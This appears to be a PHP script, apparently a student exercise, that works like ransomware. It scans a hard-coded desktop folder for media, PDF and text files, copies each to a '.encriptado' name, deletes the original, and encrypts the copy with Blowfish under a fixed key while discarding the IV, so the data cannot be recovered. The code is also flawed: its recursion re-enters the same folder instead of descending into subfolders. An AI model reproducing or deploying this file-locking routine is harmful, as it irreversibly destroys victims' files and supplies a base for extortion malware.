<?php
error_reporting(0);


class EncriptarArchivos {
    private $carpeta;
    private $new_file_name;
    private $archivosDesencriptar;
    private $extensionEscogida;
    
    public function __construct() {
        $this->carpeta = "C:/Users/HP/Desktop/SDR404";
        $this->archivosDesencriptar = [];
    }

    public function encriptar() {
        $directory = $this->carpeta;
        if(is_dir($directory)) {
            //   echo "Ya lo leí. Es un directorio en el escritorio de Windows.";
            $gestor = opendir($directory);
            echo "<ul>";

            //Recorrer elementos de la carpeta
            while(($archivo = readdir($gestor)) !== false) {
                $ruta_completa = $directory . "/" . $archivo;

                //Se muestran todos los archivos y carpetas excepto "." y ".."
                if($archivo != "." && $archivo != "..") {
                    //Se recorre si es un directorio dentro de la carpeta establecida (SDR404)
                    if(is_dir($ruta_completa)) {
                        echo "<li>" . $archivo . "</li>";
                        $this->encriptar();
                    } else {
                        //Es un archivo normal
                        echo "<li>" . $archivo . "</li>";

                        //Verificamos si los archivos contienen las extensiones listadas
                        if(strpos($archivo, "mp3") || strpos($archivo, "png") || strpos($archivo, "jpg") || strpos($archivo, "jpeg") || strpos($archivo, "pdf") || strpos($archivo, "txt")) {
                            $extensionsPosibilities = ["mp3", "png", "jpg", "jpeg", "pdf", "txt"];
                            for($i = 0; $i < count($extensionsPosibilities); $i++) {
                                if(strpos($archivo, $extensionsPosibilities[$i]) == true) {
                                    $this->extensionEscogida = $extensionsPosibilities[$i];
                                }
                            }
                            $file_extension = explode(".", $archivo);
                            $this->new_file_name = $file_extension[0] . "." . $this->extensionEscogida . ".encriptado";
                            
                            //Nuevo directorio para los archivos nuevos generados
                            $new_files_directory = $this->carpeta . "/" . $this->new_file_name;

                            if(!file_exists($new_files_directory)) {
                                $copied_file = copy($ruta_completa, $new_files_directory);
                                unlink($ruta_completa);
                                echo "Se ha realizado exitosamente la copia del archivo.";

                                $datos = file_get_contents($new_files_directory);
                                $algorithm = MCRYPT_BLOWFISH;
                                $key = 'nambechele';
                                $mode = MCRYPT_MODE_CBC;
                                $iv = mcrypt_create_iv(mcrypt_get_iv_size($algorithm, $mode), MCRYPT_DEV_URANDOM);

                                $data_encrypted = mcrypt_encrypt($algorithm, $key, $datos, $mode, $iv);
                                $plain_text = base64_encode($data_encrypted);
                                file_put_contents($new_files_directory, $plain_text); //Escribimos el contenido de bytes, encriptadamente en el archivo.

                            } else {
                                echo "No se ha movido a encriptar.";
                            }
                        }
                    }   
                }  
            }
            
            //Cerrar el gestor de archivos
            closedir($gestor);
            echo "</ul>";
            
        
        } else
            echo "No lo puedo leer. No sé qué es.";

        
    }
}